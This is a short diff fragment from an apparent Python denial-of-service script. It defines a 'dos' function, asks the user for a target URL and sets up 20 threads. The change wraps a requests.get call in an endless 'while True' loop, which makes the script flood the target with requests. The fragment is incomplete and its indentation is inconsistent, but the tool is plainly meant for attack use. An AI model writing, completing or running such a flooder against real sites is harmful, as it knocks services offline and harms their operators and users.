@@ -26,6 +26,7 @@ print("")
 input("Press ENTER to continue ")
 print("")
 def dos(target):
+    while True:
         res = requests.get(url)
 threads = 20        
 url = input("Target URL [https://example.com]: ")
